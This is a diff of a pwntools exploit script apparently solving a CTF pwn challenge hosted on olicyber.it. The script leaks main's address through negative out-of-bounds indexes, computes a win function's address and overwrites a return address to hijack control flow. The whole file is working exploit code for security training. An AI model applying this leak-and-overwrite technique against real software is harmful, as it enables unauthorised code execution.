@@ -1,28 +1,44 @@
 from pwn import *
 from Crypto.Util.number import long_to_bytes, bytes_to_long
 
-r = remote("fritto-disordinato.challs.olicyber.it", 33001)
+from pwn import *
 
-ret = []
+if args.REMOTE:
+  r = remote("fritto-disordinato.challs.olicyber.it", 33001)
+else:
+  r = gdb.debug("./fritto", """
+    b *main
+    continue
+  """)
 
-for i in range(2):
-    r.recvuntil(b">")
-    r.sendline(b"1")
-    r.recvline()
-    r.sendline(str(144+i*4))
-    r.recvuntil(b": ")
-    ret.append(int(r.recvline()))
+r.recvuntil(b"> ")
 
-print(ret)
-ret = p32(ret[0]) + p32(ret[1])
-print(ret)
-winAddr = bytes_to_long(ret) - 0x9690 + 0x99A0
-print(winAddr)
+r.sendline(b"1")
+r.recvline()
+r.sendline(b"-9")
+r.recvuntil(b": ")
 
+
+first_main_address = long_to_bytes(int(r.recvline()[:-1]))
+
+r.sendline(b"1")
+r.recvline()
+r.sendline(b"-10")
+r.recvuntil(b": ")
+
+second_main_address = long_to_bytes(int(r.recvline()[:-1]) + (1<<32)) #two's complement 
+
+main_address = bytes_to_long(first_main_address + second_main_address) - 241 #241 is the offset from the start of the main function
+
+offset = main_address - 0x9690
+
+win_address = offset + 0x99a0
+
+print(hex(main_address), hex(offset), hex(win_address))
 r.sendline(b"0")
 r.recvline()
-r.sendline(b"144")
+r.sendline(b"-10")
 r.recvline()
-r.sendline(p64(winAddr))
 
+r.sendline(str(win_address % 2**32).encode())
 r.interactive()
